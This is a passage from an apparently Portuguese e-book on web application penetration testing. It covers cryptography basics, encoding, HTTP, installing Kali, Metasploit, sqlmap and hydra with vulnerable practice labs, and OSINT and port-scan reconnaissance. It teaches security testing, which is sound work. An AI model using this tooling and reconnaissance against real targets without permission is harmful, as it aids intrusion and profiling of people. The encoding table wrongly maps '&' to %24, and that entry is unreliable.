Ao compararmos com a cifra simétrica, as cifras assimétricas são mais lentas e 
necessitam de chaves maiores para garantir um mesmo nível de segurança. Por outro 
lado, o número de chaves utilizadas é bem menor. 
Exemplo de uso da chave assimétrica: 
1. Alice deseja enviar uma mensagem secreta para Beto.  
2. Beto encaminha sua chave pública para Alice.  
3. Alice utiliza a chave pública de Beto para cifrar uma mensagem e enviar o resultado 
a ele.  
4. Como somente Beto possui a chave privada correspondente, somente ele é capaz 
de recuperar a mensagem original. 
O RSA, cujo nome deriva dos criadores Rivest, Shamir e Adleman, foi a primeira cifra 
assimétrica da história da criptografia e é baseada na dificuldade da fatoração de números 
inteiros grandes. Atualmente, é o sistema de chave pública mais utilizado, principalmente, 
na negociação de túneis SSL/TLS. 
Geração de um par de chaves RSA 
Um par de chaves RSA consiste em uma chave pública e da chave privada 
correspondente. O comando abaixo deve ser utilizado para geração de um par de chaves 
de k bits, com k = 2048. 
openssl genrsa -out <arquivo que armazenará par de chaves> <tamanho em bits da chave> 
Exportação da chave pública 

 
 
Para que as pessoas possam cifrar mensagens para você, é necessário que elas tenham 
uma cópia autêntica da sua chave pública. Normalmente, isso é feito por meio de 
certificados digitais, mas, por enquanto, apenas exportaremos a chave pública para um 
arquivo separado, da seguinte maneira: 
openssl rsa –in <arquivo com o par de chaves> -pubout > <arquivo chave pública> 
Cifrando mensagens 
Neste momento é necessário disponibilizar sua chave pública para aqueles que queiram 
enviar-lhe mensagens sigilosas. Assim, forneça a chave pública para quem irá lhe enviar 
uma mensagem cifrada. Crie um arquivo texto qualquer menor que 200 bytes e execute o 
comando abaixo para cifrá-lo, usando a chave pública previamente fornecida. 
openssl rsautl –in <arquivo a ser cifrado> -out <arquivo cifrado> -inkey <chave pública> -pubin –
encrypt 
Verifique o conteúdo do arquivo cifrado e veja que ele é binário, não tendo nenhuma 
relação com o arquivo em claro. Porém, observe que o tamanho do arquivo é exatamente 
o mesmo que o tamanho da chave. 
5. Decifrando mensagens 
Repasse o arquivo gerado a seu colega que disponibilizou a chave pública, para que ele 
possa recuperar a mensagem original. Envie também o arquivo cifrado a outro colega que 
não possua a chave privada correspondente. O comando para deciframento é: 
openssl rsautl –in <arquivo cifrado> -out <arquivo decifrado> -inkey <arquivo chave privada> -decrypt 
O destinatário correto conseguirá decifrar o arquivo e recuperar o arquivo original, 
enquanto o usuário que não possui a chave privada correspondente obterá erro ao 
executar o comando acima. 
Hash 
É uma função que transforma dados de qualquer tamanho em uma sequência fixa de 
caracteres. Hashes são usados para verificar a integridade dos dados, pois qualquer 

 
 
pequena mudança no dado original resulta em um hash completamente diferente. Hashes 
não podem ser revertidos para obter o dado original. 
 
TLS (Transport Layer Security) 
TLS é um protocolo que garante a segurança das comunicações na internet. Ele encripta 
os dados transmitidos entre o seu navegador e o servidor web, protegendo contra 
interceptações e garantindo que você está se comunicando com o servidor correto. É o 
sucessor do SSL (Secure Sockets Layer). 
mTLS (mutual Transport Layer Security) 
Mutual TLS é uma extensão do protocolo TLS onde tanto o cliente quanto o servidor se 
autenticam mutuamente usando certificados digitais.  
No mTLS, além do servidor apresentar seu certificado para provar sua identidade ao 
cliente (como no TLS), o cliente também apresenta um certificado para o servidor, 
garantindo que ambos os lados da comunicação são confiáveis. Isso adiciona uma 
camada extra de segurança, especialmente útil em ambientes onde é crucial verificar a 
identidade de ambos os participantes, como em APIs e comunicações internas de 
sistemas. 
Assinatura Digital 
Uma assinatura digital é um método criptográfico que permite verificar a autenticidade e 
integridade de uma mensagem ou documento digital. Funciona como uma assinatura 
manuscrita ou um selo de veracidade, garantindo que o documento veio de uma fonte 
confiável e não foi alterado. 
Certificado Digital  
Um certificado digital é um documento eletrônico emitido por uma autoridade certificadora 
(CA) que verifica a identidade de uma entidade (como um site ou uma pessoa). Ele contém 

 
 
informações como a chave pública da entidade e a assinatura digital da CA, permitindo 
que outras partes confiem na autenticidade da entidade. 
1.7. Codificação 
Mesmo que as aplicações web tenham diferentes finalidades, tecnologias, etc., o uso da 
codificação (encoding) de dados é algo que não pode ser negligenciado. 
Do ponto de vista dos testes de penetração, entender que tipo de codificação de dados 
está sendo usada e como ela funciona é fundamental para garantir que os testes sejam 
realizados conforme o esperado. 
As URLs enviados pela Internet devem conter caracteres no intervalo do conjunto de 
caracteres do código US-ASCII. Se caracteres não seguros estiverem presentes em um 
URL, será necessário codificá-los. 
A codificação de URL, ou codificação de porcentagem, substitui caracteres fora do 
conjunto permitido por um "%" seguido pelos dois dígitos hexadecimais que representam 
o valor numérico do octeto. 
URL Encoding 
Classificação 
Caracteres incluídos 
Codificação 
necessária? 
Caractere Seguro 
Caracteres alfanuméricos [0-9a-zA-Z] e caracteres 
não reservados. Caracteres reservados quando 
usado para seus propósitos reservados (i.e., ponto de 
interrogação para string de consulta) 
NÃO 
Caracteres não reservados 
- . _ ~ (não inclui espaços em branco) 
NÃO 
Caracteres reservados 
: / ? # [ ] @ ! $ & ' ( ) * + , ; = (não inclui espaços em 
branco) 
SIM 
Caracteres Inseguros 
Inclui espaços em branco/vazio e " < > % { } | \ ^ ` 
SIM 
Caracteres de controle ASCII 
Inclui o interval de caracteres ISO-8859-1 (ISO-Latin) 
00-1F hex (0-31 decimal) e 7F (127 decimal) 
SIM 
Caracteres não-ASCII 
Inclui toda a “metade superior” do conjunto ISO-Latino 
80-FF hex (128-255 decimal) 
SIM 

 
 
Todos os outros caracters 
Qualquer caractere não mencionado acima deve ser 
codificado por porcentagem 
SIM 
 
Caractere 
Propósito na URI 
Codificação 
# 
Separar âncoras 
%23 
? 
Separar string de consulta 
%3F 
& 
Separar elementos da consulta 
%24 
% 
Indica um caractere codificado 
%25 
/ 
Separar domínio e diretórios 
%2F 
+ 
Indica um espaço 
%2B 
<espaço> 
Não recomendado 
%20 ou + 
HTML Encoding  
Mesmo em HTML, é importante considerar a integridade das informações das URLs e 
garantir que os agentes do usuário (navegadores e companhia) exibam os dados 
corretamente. 
Há duas questões principais a serem abordadas: informar ao agente do usuário sobre qual 
codificação de caracteres será usada no documento e preservar o significado real de 
alguns caracteres que possuem significado especial. 
Para gerar possíveis ataques e casos de teste, você deve não apenas saber como 
funciona esse tipo de codificação, mas também saber como funciona o mecanismo de 
decodificação. 
Existem várias maneiras de instruir o agente do usuário sobre qual codificação de 
caracteres foi usada em um determinado documento. 
Esses métodos usam o protocolo HTTP e/ou diretivas HTML. 

 
 
Em HTML, existem alguns caracteres especiais que podem ter vários significados. Por 
exemplo, o caractere < pode representar o seguinte: 
O início de um elemento de tag 
<span>Olá</span> 
Um operador de comparação em JavaScript 
If (x < 7) { 
Parte de uma mensagem de texto 
"…menor do que 3 seria escrito como < 3…" 
Para preservar o significado real dos caracteres, a especificação HTML fornece uma 
maneira de escapar desses caracteres especiais para que eles não sejam "confundidos" 
como HTML ou outros códigos. 
Caractere Referência 
Regra 
Cacractere Encodado 
Mencionar uma entidade 
& + entidade mencionada +; 
&lt; 
Número decimal 
& + # + D +; 
D = um número decimal 
&#60; 
Número hexadecimal 
& + #x + H +; 
H = um número hexadecimal 
&#x3c; 
Base64 
O alfabeto do esquema de codificação Base64 é composto por dígitos [0-9] e letras latinas, 
maiúsculas e minúsculas [a-zA-Z], para um total de 62 valores. 
Para completar o conjunto de caracteres para 64, existem os caracteres de mais (+) e 
barra (/). No entanto, diferentes implementações podem usar outros valores para os dois 
caracteres mais recentes e o usado para preenchimento (=). 

 
 
O código a seguir mostrará uma imagem em um documento da web. O servidor enviará 
esta imagem sem a necessidade de lê-la de outra fonte como o sistema de arquivos. 
Exemplo de Base64: 
<img_src="data:image/gif;base64,R0lGODlhDwAPAKECAAAAzMzM/////wAAACwAAAAA
DwAPAAACIISPeQHsrZ5ModrLlN48CXF8m2iQ3YmmKqVlRtW4MLwWACH+H09wdGlta
XplZCBieSBVbGVhZCBTbWFydFNhdmVyIQAAOw=="alt="Base64 
encoded 
image" 
width="150"height="150"/> 
 
1.8. Protocolo HTTP e HTTPS 
RFC 1945: ...é um protocolo de nível de aplicação com a leveza e velocidade necessários 
para sistemas de informação distribuídos, colaborativos e hipermídia. Ele é um protocolo 
genérico, sem estado, orientado a objetos que pode ser usado para muitas tarefas, como 
servidores de nomes e gerenciamento distribuído de objetos sistemas, através da 
extensão de seus métodos de solicita. 
O protocolo HTTP não possui nativamente nenhum mecanismo para proteger os dados. 
Por essa questão foi criado o protocolo HTTPS para transporte de dados sigilosos. Hoje 
o HTTPS tornou-se um padrão e requisito indispensável para não permitir que os dados 
sejam adulterados em trânsito, sendo o primeiro requisito de segurança lembrado em 
qualquer aplicação web. 
O protocolo opera no formato cliente-servidor, no qual o navegador web (cliente) realiza 
uma requisição de recurso a um servidor web, que responde com o conteúdo solicitado, 
se existir. 
 

 
 
Exemplo de conexão HTTP 
 
Exemplo de conexão HTTPS 
Como dito no primeiro parágrafo desta seção, o HTTP não é orientado à conexão e, assim, 
é um protocolo que não mantém estado das trocas de mensagens. Considerando como 
era utilizado nos primórdios, isso, de fato, não era uma necessidade, mas com o passar 
do tempo e a dinamicidade das aplicações, foram criados recursos que compensavam 
essa características, como o cookie, por exemplo. 
Os recursos são identificados de maneira única por meio de Uniform Resource Locators 
(URLs). Uma URL define o protocolo de acesso, o servidor do recurso, porta utilizada, 
caminho no servidor até o elemento, nome do recurso e parâmetros. 
Destaco que nem todos esses itens são obrigatórios em uma requisição. 
Requisição HTTP 
Requisições HTTP são mensagens enviadas pelo cliente para iniciar uma troca de 
mensagens com o servidor. Suas linhas iniciais contêm três elementos: 
• 
Um método HTTP 
• 
URL  
• 
Versão do HTTP 
• 
Cabeçalho (header) 
• 
Corpo da mensagem (body)  
Exemplo de uma requisição:  
 
GET /index.html HTTP/1.1 

 
 
Neste exemplo: 
• 
GET é o método HTTP. 
• 
/index.html é recurso solicitado. 
• 
HTTP/1.1 é a versão do protocolo HTTP. 
Cabeçalhos HTTP 
Cabeçalhos HTTP são uma cadeia de caracteres insensível à caixa alta e seguida de dois 
pontos (':') e um valor cuja estrutura depende do cabeçalho.  
Há numerosos cabeçalhos de requisição disponíveis. Eles podem ser divididos em vários 
grupos: 
• 
Cabeçalhos gerais, se aplicam à mensagem como um todo. 
• 
Cabeçalhos de requisição, como User-Agent, Accept-Type, modificam a 
requisição, especificando-a mais (como Accept-Language), dando-a contexto 
(como Referer), ou restringindo-a condicionalmente (como If-None). 
• 
Cabeçalhos de entidade, como Content-Length que se aplicam ao corpo da 
mensagem. Obviamente este cabeçalho não será transmitido se não houver corpo 
na requisição. 
 
Corpo da mensagem (body) 
A parte final da requisição é o corpo. Nem todas as requisições têm um, geralmente as 
que solicitam recursos, como GET, HEAD, DELETE, ou OPTIONS, usualmente não 
precisam de um. Porém, as requisições que enviam dados ao servidor a fim de inserir ou 
atualizá-lo, como é caso do POST, PUT e PATCH, necessitam de um body. 

 
 
O corpo da mensagem pode ser dividido, grosso modo, em duas categorias: 
• 
Corpos de recurso-simples, consistindo em um único arquivo, definido pelos dois 
cabeçalhos: Content-Type e Content-Length. 
• 
Corpos de recurso-múltiplo, consistindo em um corpo de múltiplas partes, cada uma 
contendo uma porção diferente de informação. Este é tipicamente associado 
a Formulários HTML. 
Exemplo de um corpo JSON para uma requisição POST: 
{ 
  "username": "user123", 
  "password": "pass123"  
} 
Resposta HTTP 
Uma resposta HTTP também é composta por três partes principais:  
• a linha de status 
• os cabeçalhos (headers), 
• e o corpo (body). 
Linha de Status 
A linha de status inclui a versão do protocolo HTTP, o código de status e a mensagem de 
status. Por exemplo: 
HTTP/1.1 200 OK 
Neste exemplo: 
• 
HTTP/1.1 é a versão do protocolo HTTP. 
• 
200 é o código de status. 
• 
OK é a mensagem de status. 
Corpo da Resposta (Body) 
O corpo da resposta contém os dados enviados pelo servidor ao cliente. Pode ser HTML, 
JSON, XML, etc. Exemplo de um corpo HTML: 

 
 
<!DOCTYPE html> 
<html> 
<head> 
    <title>Exemplo de Response</title> 
</head> 
<body> 
    <h1>Hello, World!</h1> 
</body> 
</html> 
Métodos HTTP 
Indicam a ação solicitada pela requisição. 
• GET - Solicita recursos do servidor e permite parâmetros passados como parte da 
URL 
• POST - Envia ações para o servidor e os parâmetros podem ser passado no corpo 
da requisição. 
• PUT - Usado para atualizar um recurso existente ou criar um recurso no local 
especificado pelo cliente 
• PATCH - Utilizado para atualização parcial de recursos 
• DELETE - Utilizado para remover um recurso especificado pela URI 
• OPTIONS - Lista as opções/parâmetros aceitos pelo recurso solicitado.  
• TRACE - Executa teste ao longo do caminho da requisição até o destino. 
• CONNECT - Utilizado para tunelamento via proxies HTTP 
Status Code HTTP 
São valores numéricos de três dígitos que denotam o resultado da solicitação. São 
divididos em cinco classes, de acordo com o significado: 
• 1xx: Códigos de informação.  
• 2xx: Indicam que a requisição foi atendida com sucesso.  
o Ex.: 200 OK  
• 3xx: Informam que o cliente precisa realizar ações adicionais para completar a 
requisição. 
o Ex.: 301 Moved Permanently  
• 4xx: Enviadas quando a requisição não pode ser atendida, por erro de sintaxe, falta 
de autorização ou porque o recurso não foi encontrado.  

 
 
o Ex.: 404 Not Found  
• 5xx: Indicam erros no servidor que o impediram de atender a requisição.  
o Ex.: 501 Not Implemented 
Cookies 
Um cookie é um elemento do protocolo HTTP, enviado ao navegador pelo servidor, com 
o objetivo de lembrar informações de um usuário específico.  
• Formado por uma cadeia de caracteres, organizada em pares nome/valor, 
separados por ponto e vírgula.  
• Uma vez definido, é enviado pelo navegador em toda requisição subsequente ao 
mesmo domínio.  
• Dois usos principais são a manutenção de sessão e a autenticação de usuários. 
Alguns atributos podem ser definidos para os cookies, além dos pares contendo nome e 
valor (Stuttard e Pinto, 2007): 
• expires: define por quanto tempo o cookie é válido e, assim, permite que o estado 
se mantenha após o navegador ser encerrado. 
• domain: define para quais domínios o cookie é válido, desde que o servidor seja 
um membro daqueles. 
• path: define os caminhos para os quais o cookie é válido. 
• secure: demanda que o cookie seja enviado somente em requisições feitas por 
meio de HTTPS. 
• HttpOnly: quando definido, impede que seja acessado por código executado no 
lado do cliente. 
Autenticação HTTP 
O protocolo HTTP possui métodos nativos para autenticar usuários, Basic e Digest. 
Com o avanço da tecnologia e as crescentes preocupações com segurança, novos 
métodos, como autenticação via tokens: 
• Bearer Token 

 
 
• OAuth 2.0  
• OpenID Connect 
Fluxo de Autenticação HTTP 
• 
Solicitação do Recurso Protegido 
• 
O usuário solicita acesso a um recurso protegido no servidor. 
• 
Desafio de Autenticação 
• 
Se o usuário ainda não estiver autenticado, o servidor responde com um 
código de estado 401 Unauthorized, acompanhado de um cabeçalho WWW-
Authenticate, que indica o tipo de autenticação requerido. 
• 
Submissão das Credenciais 
• 
No método Basic, o usuário insere nome de usuário e senha, que são 
enviados ao servidor codificados em BASE64 dentro do cabeçalho 
Authorization. 
• 
No método Digest, a senha é protegida usando um hash MD5 em um 
processo que inclui um nonce (número usado uma única vez) para prevenir 
ataques de replay. 
• 
Validação e Acesso 
• 
Se as credenciais forem validadas pelo servidor, o acesso ao recurso é 
concedido. As credenciais geralmente são enviadas em todas as 
solicitações subsequentes ao mesmo domínio. Caso contrário, o fluxo 
retorna ao passo 2 para uma nova tentativa de autenticação. 
 
1.9. Instalação de ferramentas e configuração do ambiente 
Neste e-book proponho utilizarmos o Kali Linux dentro do Windows Subsystem for Linux 
(WSL) no Windows, o propósito é evitar falhas causadas por virtualizadores, como 

 
 
configuração de rede, perda de disco, e uso inapropriado de recursos USB. Siga este 
passo a passo para instalá-lo: 
1. Habilite o WSL. Abra o PowerShell como administrador  
 
wsl --install 
Caso o comando acima não funcione, você pode habilitar manualmente o WSL e a 
Plataforma de Máquina Virtual com os seguintes comandos: 
dism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart 
dism.exe /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all 
2. Após habilitar o WSL e a virtualização, reinicie seu computador. 
3. Abra novamente o PowerShell como administrador. 
4. Rode os comandos abaixo para aplicar as últimas atualizações do wsl e definir a 
versão 2 da ferramenta como a padrão do sistema. 
wsl --update 
wsl --set-default-version 2 
5. Há duas formas de instalar o Kali Linux no wsl, a primeira é pelo próprio Windows. 
Vá a Microsoft Store. No campo de pesquisa, digite “Kali Linux” e selecione o 
resultado apropriado. Clique em “Obter” ou “Instalar” para baixar e instalar o Kali 
Linux. 
6. A segunda forma é instalar pelo próprio prompt do próprio Power Shell, executando 
o comando: 

 
 
wsl --install Kali-Linux 
7. Após a instalação, abra o Kali Linux através do menu Iniciar do Windows ou pelo 
comando `kali` no PowerShell. 
Nota: Trouxe as duas opções de instalação devido a variedade de versões, edições e 
atualizações do Windows. Maiores detalhes da instalação e troubleshooting podem ser 
encontrados no site do próprio Kali https://www.kali.org/docs/wsl/wsl-preparations/. 
Na primeira vez que abrir o Kali Linux, você será solicitado a criar um usuário e definir 
uma senha. Siga as instruções na tela para concluir essa configuração.  
Execute os seguintes comandos para atualizar a lista de pacotes e o sistema: 
sudo apt update 
sudo apt upgrade 
O Kali Linux vem com várias ferramentas de segurança pré-instaladas, mas você pode 
instalar pacotes adicionais conforme necessário. Abaixo iremos instalar diversas 
ferramentas que serão explicadas no decorrer do e-book e apoiaram os teste de 
vulnerabilidade. 
sudo apt install metasploit-framework nmap ssh nikto hydra john sqlmap set 
Utilitários adicionais  
Vamos instalar também alguns utilitários que tornam a experiência mais atrativa e 
colaboram para os testes de intrusão 
sudo apt install git wget apache2 mariadb-server build-essential python3 python3-pip vim gcc netcat 
grep 
Seguindo esses passos, você terá o Kali Linux funcionando no WSL, permitindo que você 
aproveite as ferramentas de segurança e as capacidades de teste no ambiente Windows. 
Docker 
Docker é uma plataforma de conteinerização que permite empacotar, distribuir e executar 
aplicativos em ambientes isolados chamados "contêineres". Esses contêineres incluem 

 
 
tudo o que um aplicativo precisa para funcionar, como código, bibliotecas e dependências, 
garantindo que ele rode de forma consistente em diferentes ambientes. Docker simplifica 
o desenvolvimento, a implantação e o gerenciamento de aplicativos, promovendo a 
eficiência e a escalabilidade. Ele também facilita a criação de ambientes de teste e 
produção portáteis e reproduzíveis. 
Instalação  
Para instalar o pacote do docker é bem simples, siga os comandos abaixo: 
sudo apt update 
sudo apt install docker.io -y 
sudo service docker start 
DVWA 
O Damn Vulnerable Web Application (DVWA) é uma aplicação web propositalmente 
vulnerável, projetada para facilitar que profissionais de segurança e desenvolvedores 
pratiquem técnicas de intrusão e avaliem o nível de segurança de aplicações web.  
O DVWA simula um ambiente real em que várias vulnerabilidades comuns, como SQL 
Injection, Cross-Site Scripting (XSS), File Inclusion, e Cross-Site Request Forgery (CSRF), 
podem ser exploradas de forma controlada. 
Instalação  
Com o docker instalado, agora, você pode baixar e executar o container do DVWA. O 
comando abaixo faz o download da imagem do DVWA e a executa: 
sudo docker run --rm -it -p 80:80 vulnerables/web-dvwa 
Uma vez que o container estiver em execução, você pode acessar o DVWA no seu 
navegador através do endereço: http://localhost. 
Configurações Iniciais 
1. Instale o Banco de Dados: 
o Acesse o DVWA em qualquer navegador por meio da URL 
http://127.0.0.1/dvwa. 
o Use as credenciais padrão para login: 

 
 
▪ 
Usuário: admin 
▪ 
Senha: password 
o Clique em "Create / Reset Database" para criar as tabelas necessárias e 
configurar o banco de dados. 
2. Configuração dos Níveis de Segurança: 
o O DVWA permite ajustar o nível de segurança da aplicação, que vai desde 
Low até Impossible. Isso permite praticar explorações de diferentes 
dificuldades. Estes são os níveis de segurança: 
▪ 
Low: Nenhuma mitigação de segurança. 
▪ 
Medium: Alguma segurança, mas ainda vulnerável. 
▪ 
High: Proteções de segurança razoáveis. 
▪ 
Impossible: Todas as vulnerabilidades foram corrigidas. 
Considerações Finais sobre o DVWA 
O DVWA é uma ferramenta poderosa para aprender e testar habilidades de 
cibersegurança. No entanto, ele deve ser usado em um ambiente controlado, nunca em 
um servidor de produção ou acessível ao público. 
SpiderFoot 
O SpiderFoot é uma ferramenta OSINT que coleta diversas informações do alvo na fase 
de reconhecimento. Para instalar o SpiderFoot Footprint no Kali Linux, siga estes passos: 
sudo apt update 
sudo apt install spiderfoot 
sudo apt install python3 python3-pip git 
cd /opt 
git clone https://github.com/smicallef/spiderfoot.git 
cd spiderfoot 
pip3 install -r requirements.txt 
spiderfoot -l 127.0.0.1:5555 
BurpSuite 
O Burp Suite é uma solução para teste de aplicações que possui várias ferramentas 
internas para realização de análise de aplicações web, incluindo interceptação de tráfego 
(proxy), scan de vulnerabilidade (versão paga), manipulador de tráfego, fuzzer, entre 

 
 
outros. Seu poder fica ainda maior com a adição de plugins desenvolvidos pela 
comunidade ou por pesquisadores da PortSwigger, sua mantenedora. 
Para 
baixar 
o 
Burp 
Suite, 
basta 
acessar 
o 
endereço 
https://portswigger.net/burp/releases/professional-community-2024-6-6, 
baixar 
o 
executável apropriado para o seu sistema operacional e instalá-lo no seu computador. No 
momento que escrevo este e-book a versão gratuita do Burp Suite é a 2024.6.6. 
 
OWASP ZAP 
O OWASP ZAP (Zed Attack Proxy) é uma ferramenta de código aberto para testes de 
segurança em aplicações web, desenvolvida pela OWASP. Assim como o Burp, ele atua 
como um proxy de interceptação que permite a análise e modificação do tráfego entre o 
navegador e a aplicação web para detectar vulnerabilidades.  
O ZAP oferece funcionalidades de scan automatizado e análise manual. A ferramenta é 
configurável e extensível, com suporte a plugins e scripts para personalização. Você pode 
baixa-la acessando o link  https://github.com/zaproxy/zaproxy/releases/download/ e 
escolher a versão adequada para o seu sistema operacional. 
No momento que escrevo este e-book a versão mais atual do OWASP ZAP é a 2.15.0.
 
 

 
 
Semgrep 
Semgrep é uma ferramenta opensources de análise estática de código que permite 
identificar vulnerabilidades e problemas de segurança em diversos tipos de código-fonte. 
Com o Semgrep os usuários criem suas próprias regras de busca, ou usar regras 
predefinidas, para detectar padrões de código inseguro ou que violem as boas práticas de 
desenvolvimento seguro.  
A 
ferramenta 
suporta 
diversas 
linguagens 
de 
programação, 
tais 
como  
JavaScript/TypeScript, Python, Java, Go, Ruby, PHP, C, C++, C# e Kotlin.  
O 
Semgrep 
está 
disponível 
através 
do 
seu 
repositório 
no 
GitHub 
https://github.com/semgrep/semgrep.  
Instalação 
Se ainda não estiver instalado, instale o Python3 e pip: 
sudo apt install python3 python3-pip -y 
Instale o Semgrep usando pip: 
pip3 install semgrep 
OWASP Juice Shop 
É um moderno e sofisticado aplicativo web inseguro, ele foi desenvolvido pela OWASP 
para ser usado em treinamentos de segurança, demos de conscientização e CTF (capture 
the flag). A ferramenta abrange vulnerabilidades de todo o OWASP Top Ten, juntamente 
com muitas outras falhas de segurança encontradas em aplicativos do mundo real. 
Instalação 
Instale o Node.js e o npm 
sudo apt install nodejs npm -y 
Instale o git (se não estiver instalado) 
sudo apt install git -y 
Clone o repositório do OWASP Juice Shop para o diretório /opt 

 
 
cd /opt 
git clone https://github.com/juice-shop/juice-shop.git 
cd juice-shop 
Dentro do diretório do Juice Shop, instale as dependências necessárias usando o npm 
npm install 
Inicie o OWASP Juice Shop 
npm start 
Isso irá iniciar o servidor e o OWASP Juice Shop estará rodando no http://localhost:3000. 
Abra o navegador e acesse a URL: http://localhost:3000. 
Sempre que precisar acessar o Juice Shop vá até o direito onde está o repositório da 
aplicação e rode o comando npm start.  
 
UNIDADE 2 – Reconhecimento do Alvo 
A unidade 2 foca nas iniciativas para reconhecimento da superfície de ataque da aplicação 
alvo. O objetivo nesta fase é descobrir e coletar o máximo de informações que colaborem 
para a execução de um teste bem-sucedido numa aplicação web. 
OBJETIVOS DA UNIDADE 
Ao final dos estudos, você deverá ser capaz de: 
• Realizar a descoberta e coleta de informações relevantes da aplicação web 
• Identificar inputs da aplicação e componentes de terceiro 
• Identificar pontos de abuso da lógica da aplicação 
• Analisar APIs, JSON e Javascript 
 

 
 
2.1. Ganho de Informações 
Reconnaissance 
Esta é a primeira etapa do processo de hacking, nele o ethical hacker recolhe todas as 
informações disponíveis sobre redes, sistemas, pessoas e informações públicas em vigor 
do sistema alvo, bem como as medidas de segurança que foram implementadas para 
protegê-las. O hacker ético tem dois tipos de reconhecimento que ele pode fazer nesta 
fase: ativo e passivo. Reconhecimento ativo envolve a interação com o sistema alvo, 
enquanto o reconhecimento passivo envolve a coleta de informações sem interagir com o 
sistema alvo. 
Reconhecimento passivo 
Reconhecimento passivo é uma técnica usada para reunir informações sobre o alvo sem 
se envolver ativamente com os sistemas. Muitas vezes é usado para obter informações 
sobre a organização alvo e sua infraestrutura sem ser detectado. As técnicas de 
reconhecimento passivo incluem OSINT (Open Source Intelligence Techniques), 
monitoramento do tráfego de rede, análise dos registros do sistema e busca de portas ou 
serviços abertos. 
Hackers éticos também usam reconhecimento passivo para realizar ataques contra um 
sistema para determinar suas vulnerabilidades. Técnicas passivas podem ser usadas para 
não serem detectadas enquanto se coleta informação, enquanto as técnicas ativas podem 
ser usadas para informações mais detalhadas. Reconhecimento passivo NÃO envolve 
interação ativa com o alvo. 
Ferramentas e técnicas para reconhecimento passivo: 
Open Source Intelligence Techniques (OSINT): coleta de dados de fontes públicas, 
como mecanismos de pesquisa, plataformas de mídia social, bancos de dados públicos 
ou fóruns on-line. 
Monitoramento do tráfego de rede: observando o tráfego que o servidor envia e recebe, 
em vez de enviar o tráfego para eles mesmos. Nesse processo podemos utilizar 
ferramentas como o Burp Suite, OWASP ZAP etc. 

 
 
Busca de portas ou serviços abertos: Identificar portas ou serviços abertos que podem 
ser explorados. Nesse processo podemos utilizar ferramentas como o nmap, Nessus, 
Nikto, Mestaploit etc. 
Benefícios e consideração ética no reconhecimento passivo 
Benefícios 
• Ajudar hackers éticos a identificar vulnerabilidades em um sistema antes desferir 
um ataque real contra o alvo. 
• Ajudar as organizações a identificar potenciais riscos de segurança e tomar 
medidas adequadas para mitigá-los. Diversas ferramentas pagas e gratuitas podem 
ser utilizadas nesta atividade. 
• Ajudar as organizações a melhorar sua postura de segurança, identificando 
fraquezas em seus sistemas. 
• Ajudar as organizações a ficar à frente dos criminosos cibernéticos, identificando 
ameaças potenciais antes que possam ser exploradas. 
• Ajudar as organizações a cumprir os requisitos regulamentares, identificando 
potenciais riscos de segurança. 
Considerações éticas 
• Deve ser realizado de forma ética e legal, sem violar nenhuma lei ou regulamento. 
• Deve ser realizado com a permissão da organização alvo, ou com a aprovação de 
uma autoridade legal. 
• Não deve ser usado para coletar informações para fins maliciosos, como roubo de 
identidade ou fraude. 
• Não deve ser usado para reunir informações que não são relevantes para a 
segurança da organização alvo. 
• Deve ser realizado com o máximo cuidado para evitar quaisquer consequências 
não intencionais, tais como interromper o funcionamento normal do sistema alvo. 
Reconhecimento ativo 

 
 
No reconhecimento ativo, os hackers se comunicam com alvo para coletar informações. 
O processo envolve escanear uma rede em busca de pontos fracos, como portas abertas 
ou outras vulnerabilidades. Reconhecimento ativo é diferente de reconhecimento passivo, 
pois os atacantes interagem com uma rede alvo e deixam rastros. 
Reconhecimento ativo é muitas vezes mais arriscado do que o reconhecimento passivo, 
mas pode gerar informações mais úteis. Profissionais de segurança usam vários 
aplicativos para interagir com servidores, aplicações e serviços do alvo. A coleta de dados 
pode não estar disponíveis por outros meios e programas como o Metasploit podem ser 
usados para este fim. 
As ferramentas de reconhecimento ativo quando utilizadas em conjunto com ferramentas 
apropriadas ajudam as organizações a melhorar sua postura de segurança e garantir a 
proteção dos sistemas, de todos os ângulos possíveis. Por exemplo, em conjunto com um 
Firewall, WAF (Web Application Firewall), IDS/IPS (Intrusion Detection System/ Intrusion 
Prevention System). No entanto, o reconhecimento ativo deve ser conduzido de forma 
ética e legal, não deve violar quaisquer leis ou regulamentos e não deve ser usado para 
coletar informações para fins maliciosos, como roubo de identidade ou fraude.  
Assim como o reconhecimento passivo, o reconhecimento ativo deve ser realizado com o 
máximo cuidado para evitar quaisquer consequências não intencionais, tais como 
interromper o funcionamento normal do sistema alvo. 
A seguir trago algumas ferramentas e técnicas simples e comuns para este processo: 
Port Scanning: Esta técnica envolve uma varredura do sistema de destino para identificar 
portas, serviços e aplicativos. Esta informação pode ser usada para identificar 
vulnerabilidades potenciais no sistema de destino. O nmap é a principal ferramenta 
utilizada pelos atacantes e profissionais éticos no processo de reconhecimento. 
Ping: Ferramenta nativa nos principais sistema operacionais usada para testar a 
acessibilidade de um host em uma rede IP (Internet Protocol). Também pode ser usado 
para medir o tempo de ida e volta para mensagens enviadas do host de origem para um 
computador de destino. 

 
 
Traceroute (Tracert): Outra ferramenta nativa nos principais sistema operacionais usada 
para rastrear o caminho que um pacote IP toma da origem para o destino. 
Telnet: Mais uma ferramenta nativa nos principais sistemas operacionais usada para 
estabelecer uma conexão com um computador remoto através de uma rede. 
OSINT Open Source Intelligence 
Este é um dos tópicos mais importantes desta unidade, nele falaremos sobre inteligência 
de código aberto, ou OSINT, esta técnica valiosa para adquirir informações públicas do 
alvo. O OSINT permite que coletar dados livremente acessíveis sobre pessoas e 
organizações de várias fontes, incluindo mecanismos de pesquisa, contas em rede social 
e registros do governo, para gerar um levantamento abrangente sobre o alvo. 
Ferramentas mais avançadas de OSINT podem fazer referência cruzada a esses dados, 
fornecendo uma fonte precisa de conhecimento e conectando pedaços dispersados de 
informações que poderiam não ser encontrados. No atual cenário onde dados são 
valiosos, o OSINT é um recurso inestimável para qualquer pessoa que procura se 
entender pessoas ou organizações ao seu redor. Também está se tornando cada vez mais 
popular entre os profissionais de segurança cibernética que o usam para pentest e 
detecção de ameaças externas. 
Aqui estão algumas soluções de inteligência open-source para praticarem o 
reconhecimento: 
Whatsmyname: 

 
 
 
https://whatsmyname.app/ 
A plataforma Whatsmyname funciona como um detetive de rede social. Basta enviar um 
nome de usuário ou e-mail, e ele vai varrer a web, apresentando-lhe uma lista de 
potenciais perfis de mídia social ligados a esse nome.  
Shodan: 
 
